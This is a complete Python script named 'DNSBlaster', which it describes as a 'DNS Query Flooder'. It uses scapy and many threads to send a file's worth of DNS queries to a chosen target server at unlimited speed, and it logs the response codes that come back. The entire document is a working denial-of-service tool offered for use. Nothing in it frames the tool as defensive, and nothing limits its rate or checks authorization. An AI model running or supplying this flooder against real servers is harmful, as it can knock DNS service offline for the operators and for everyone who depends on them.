#!/usr/bin/env python3
import argparse
import sys
import time
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
from scapy.all import *
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.panel import Panel
from threading import Lock, Event, Thread

console = Console()

DNSBLASTER_LOGO = r"""
  _____  _   _  _____   ____  _           _            
 |  __ \| \ | |/ ____| |  _ \| |         | |           
 | |  | |  \| | (___   | |_) | | __ _ ___| |_ ___ _ __ 
 | |  | | . ` |\___ \  |  _ <| |/ _` / __| __/ _ \ '__|
 | |__| | |\  |____) | | |_) | | (_| \__ \ ||  __/ |   
 |_____/|_| \_|_____/  |____/|_|\__,_|___/\__\___|_|   
"""

def resolve_target(target_str):
    clean = target_str.replace("http://", "").replace("https://", "").split("/")[0]
    try:
        ip = socket.gethostbyname(clean)
        return ip
    except socket.gaierror as e:
        console.print(f"[bold red]❌ Could not resolve target '{target_str}': {e}[/bold red]")
        sys.exit(1)

def send_dns_query(target_ip, domain):
    pkt = IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
    send(pkt, verbose=0)

def send_dns_query_check(target_ip, domain, timeout=0.3):
    pkt = IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
    try:
        resp = sr1(pkt, verbose=0, timeout=timeout)
        return resp
    except Exception as e:
        return e

def main():
    parser = argparse.ArgumentParser(description="🔥 DNSBlaster - DNS Query Flooder 🔥")
    parser.add_argument('-t', '--target', type=str, required=True, help="Target DNS server (IP, domain, or URL)")
    parser.add_argument('-f', '--file', type=str, required=True, help="File containing domains to query")
    parser.add_argument('--threads', type=int, default=10, help="Number of concurrent threads (default: 10)")
    parser.add_argument('--log-interval', type=int, default=5, help="Seconds between logging status (default: 5)")
    parser.add_argument('--check-timeout', type=float, default=0.3, help="Timeout in seconds for DNS reply (default: 0.3)")

    args = parser.parse_args()

    console.print(Panel.fit(DNSBLASTER_LOGO, border_style="bold red"))

    try:
        with open(args.file, 'r') as f:
            domains = [line.strip() for line in f if line.strip()]
    except Exception as e:
        console.print(f"[bold red]Error reading file:[/bold red] {e}")
        sys.exit(1)

    target_ip = resolve_target(args.target)

    console.print(f"[bold red]🔥 DNSBlaster 🔥[/bold red] - Flooding [cyan]{target_ip}[/cyan] with [green]{len(domains)}[/green] DNS queries from file [yellow]{args.file}[/yellow].")
    console.print(f"Threads: {args.threads}")
    console.print(f"Logging every {args.log_interval} seconds")
    console.print(f"DNS reply timeout: {args.check_timeout}s\n")
    console.print("[magenta]Starting flood with unlimited speed! Be careful.[/magenta]\n")

    stats_lock = Lock()
    stats = {
        'sent': 0,
        'NOERROR': 0,
        'NXDOMAIN': 0,
        'REFUSED': 0,
        'SERVFAIL': 0,
        'NoResp': 0,
        'Err': 0
    }

    stop_event = Event()

    def logging_worker():
        while not stop_event.is_set():
            time.sleep(args.log_interval)
            with stats_lock:
                console.log(
                    f"Sent: {stats['sent']} | NOERROR: {stats['NOERROR']} | NXDOMAIN: {stats['NXDOMAIN']} | "
                    f"REFUSED: {stats['REFUSED']} | SERVFAIL: {stats['SERVFAIL']} | NoResp: {stats['NoResp']} | Err: {stats['Err']}"
                )

    log_thread = Thread(target=logging_worker, daemon=True)
    log_thread.start()

    def worker(domain):
        try:
            send_dns_query(target_ip, domain)
            with stats_lock:
                stats['sent'] += 1

            resp = send_dns_query_check(target_ip, domain, timeout=args.check_timeout)
            with stats_lock:
                if resp is None:
                    stats['NoResp'] += 1
                elif isinstance(resp, Exception):
                    stats['Err'] += 1
                else:
                    rcode = resp.getlayer(DNS).rcode
                    if rcode == 0:
                        stats['NOERROR'] += 1
                    elif rcode == 3:
                        stats['NXDOMAIN'] += 1
                    elif rcode == 5:
                        stats['REFUSED'] += 1
                    elif rcode == 2:
                        stats['SERVFAIL'] += 1
                    else:
                        stats['Err'] += 1
        except Exception:
            with stats_lock:
                stats['Err'] += 1

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TimeElapsedColumn(),
        console=console,
        transient=True,
    ) as progress:
        task = progress.add_task("[green]Sending queries...", total=len(domains))

        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = []
            for domain in domains:
                futures.append(executor.submit(worker, domain))

            for future in as_completed(futures):
                progress.update(task, advance=1)
                time.sleep(0.01)  # lets the progress timer update smoothly

    stop_event.set()
    log_thread.join()

    console.print("\n[bold green]Flood complete.[/bold green]")

if __name__ == "__main__":
    main()
